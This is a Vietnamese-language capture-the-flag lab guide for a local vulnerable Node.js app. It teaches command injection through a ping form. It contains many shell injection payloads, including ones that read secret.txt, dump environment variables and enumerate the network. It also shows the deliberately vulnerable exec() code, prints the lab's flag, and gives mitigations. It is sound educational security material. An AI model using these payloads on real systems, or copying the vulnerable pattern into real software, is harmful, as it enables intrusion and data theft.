# 🎯 Command Injection Lab

Hướng dẫn chi tiết về Command Injection Lab - khai thác lỗ hổng thực thi lệnh hệ thống.

## 📍 Truy Cập Lab

```
http://localhost:3000/lab/cmdi
```

## 🎯 Mục Tiêu

1. **Test** chức năng ping bình thường
2. **Phát hiện** lỗ hổng Command Injection
3. **Khai thác** để thực thi lệnh hệ thống
4. **Đọc file** bí mật `secret.txt` và lấy FLAG

## 🗂️ File System

### Secret File

```
secret.txt
├── Content: FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}
└── Location: Project root directory
```

## 🧪 Các Bước Thực Hành

### Bước 1: Test Chức Năng Bình Thường

Nhập địa chỉ IP hợp lệ:

```
8.8.8.8
```

**Kết quả**: Hiển thị kết quả ping bình thường

```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=54 time=12.3 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=54 time=11.8 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=54 time=12.1 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=54 time=11.9 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss
```

### Bước 2: Phát Hiện Lỗ Hổng

Thử command chaining với dấu `;`:

```
8.8.8.8; whoami
```

**Kết quả**: Nếu hiển thị username → Có lỗ hổng Command Injection!

### Bước 3: Liệt Kê File

```
8.8.8.8; ls -la
```

**Kết quả**: Hiển thị danh sách file trong thư mục hiện tại

```
total 48
drwxrwxr-x  7 user user 4096 Jan 16 10:30 .
drwxrwxr-x  3 user user 4096 Jan 16 10:29 ..
-rw-rw-r--  1 user user 1234 Jan 16 10:30 server.js
-rw-rw-r--  1 user user  567 Jan 16 10:30 secret.txt
-rw-rw-r--  1 user user 1234 Jan 16 10:30 package.json
...
```

### Bước 4: Tìm File Secret

```
8.8.8.8; ls | grep secret
```

**Kết quả**: Tìm thấy `secret.txt`

### Bước 5: Đọc File Và Lấy FLAG 🚩

```
8.8.8.8; cat secret.txt
```

**Kết quả**: `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}`

## 🔍 Phân Tích Kỹ Thuật

### Code Vulnerable

```javascript
// src/controllers/CMDIController.js - KHÔNG AN TOÀN
const cmd = `ping -c 4 ${ip}`;
exec(cmd, (error, stdout, stderr) => {
    // Xử lý kết quả
});
```

### Tại Sao Có Lỗ Hổng?

1. **String Concatenation**: Nối trực tiếp user input vào command
2. **exec() Function**: Sử dụng shell execution
3. **Không Validation**: Không kiểm tra input
4. **Không Sanitization**: Không làm sạch dữ liệu

### Cách Khai Thác

**Input**: `8.8.8.8; cat secret.txt`

**Command thực tế**:

```bash
ping -c 4 8.8.8.8; cat secret.txt
```

**Giải thích**:

-   `ping -c 4 8.8.8.8` → Thực thi bình thường
-   `;` → Kết thúc lệnh đầu, bắt đầu lệnh mới
-   `cat secret.txt` → Đọc file bí mật

## 🧪 Các Payload Khác

### Command Chaining

#### Sử dụng `;` (Sequential)

```bash
8.8.8.8; whoami
8.8.8.8; pwd
8.8.8.8; id
```

#### Sử dụng `&&` (AND operator)

```bash
8.8.8.8 && whoami
8.8.8.8 && pwd
8.8.8.8 && ls -la
```

#### Sử dụng `||` (OR operator)

```bash
invalid_ip || whoami
invalid_ip || pwd
```

#### Sử dụng `|` (Pipe)

```bash
8.8.8.8; ls | wc -l
8.8.8.8; ls | grep secret
```

### Command Substitution

```bash
8.8.8.8; echo "User: $(whoami)"
8.8.8.8; echo "Date: `date`"
8.8.8.8; echo "PWD: $(pwd)"
```

### System Information

```bash
# User info
8.8.8.8; whoami
8.8.8.8; id
8.8.8.8; groups

# System info
8.8.8.8; uname -a
8.8.8.8; hostname
8.8.8.8; uptime

# Environment
8.8.8.8; env
8.8.8.8; printenv
```

### File Operations

```bash
# List files
8.8.8.8; ls -la
8.8.8.8; find . -name "*.txt"

# Read files
8.8.8.8; cat secret.txt
8.8.8.8; head -5 package.json
8.8.8.8; tail -5 server.js

# File permissions
8.8.8.8; ls -la secret.txt
8.8.8.8; file secret.txt
```

### Network Information

```bash
# Network interfaces
8.8.8.8; ifconfig
8.8.8.8; ip addr

# Network connections
8.8.8.8; netstat -tuln
8.8.8.8; ss -tuln

# DNS
8.8.8.8; nslookup google.com
8.8.8.8; dig google.com
```

## 🛡️ Cách Phòng Chống

### ❌ KHÔNG AN TOÀN

```javascript
const cmd = `ping ${ip}`;
exec(cmd, callback);
```

### ✅ AN TOÀN hơn - Sử dụng execFile()

```javascript
const { execFile } = require("child_process");

execFile("ping", ["-c", "4", ip], (error, stdout) => {
    // execFile không chạy qua shell
    // Mỗi argument được truyền riêng biệt
});
```

### ✅ TỐT HƠN - Input Validation

```javascript
// Chỉ cho phép IP address hợp lệ
const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;

if (!ipRegex.test(ip)) {
    return res.json({ error: "Invalid IP address" });
}

// Hoặc whitelist domain
const allowedDomains = ["google.com", "cloudflare.com"];
if (!allowedDomains.includes(ip)) {
    return res.json({ error: "Domain not allowed" });
}
```

### ✅ TỐT NHẤT - Sử dụng Thư Viện

```javascript
// Sử dụng thư viện ping chuyên dụng
const ping = require("ping");

ping.promise.probe(ip).then((result) => {
    // Xử lý kết quả an toàn
});
```

### ✅ SỬ DỤNG SANDBOX

```javascript
// Chạy trong container/sandbox
const { spawn } = require("child_process");

const child = spawn("ping", ["-c", "4", ip], {
    stdio: "pipe",
    timeout: 5000,
});
```

## 🎓 Bài Tập Thực Hành

### Level 1: Basic

1. Test ping với IP hợp lệ
2. Phát hiện lỗ hổng command injection
3. Lấy thông tin user hiện tại

### Level 2: Intermediate

1. Liệt kê tất cả file trong thư mục
2. Đọc file secret.txt
3. Thử các command chaining khác nhau

### Level 3: Advanced

1. Tìm file chứa từ khóa "FLAG"
2. Đọc file cấu hình hệ thống
3. Thử reverse shell (trong môi trường lab)

## ⚠️ Tác Động Trong Thực Tế

### System Compromise

-   Thực thi lệnh tùy ý
-   Đọc file nhạy cảm
-   Thay đổi cấu hình hệ thống

### Data Breach

-   Đọc database files
-   Truy cập log files
-   Lấy thông tin user

### Privilege Escalation

-   Chạy với quyền của web server
-   Truy cập file hệ thống
-   Thực thi malicious code

### Persistence

-   Tạo backdoor
-   Cài đặt malware
-   Thay đổi system files

## 🔧 Debugging Tips

### Xem Command Thực Tế

```javascript
// Server sẽ log command
console.log("Command thực thi:", cmd);
```

### Test với curl

```bash
curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8"}'

curl -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"ip":"8.8.8.8; whoami"}'
```

### Browser DevTools

-   Network tab để xem requests
-   Console để debug JavaScript
-   Response để xem command output

## 🚩 FLAG

```
FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}
```

## 📚 Tài Liệu Tham Khảo

-   [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
-   [Node.js Child Process](https://nodejs.org/api/child_process.html)
-   [Linux Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

**Độ khó**: Cơ bản - Trung bình  
**Thời gian**: 15-30 phút  
**Yêu cầu**: Kiến thức cơ bản về Linux commands
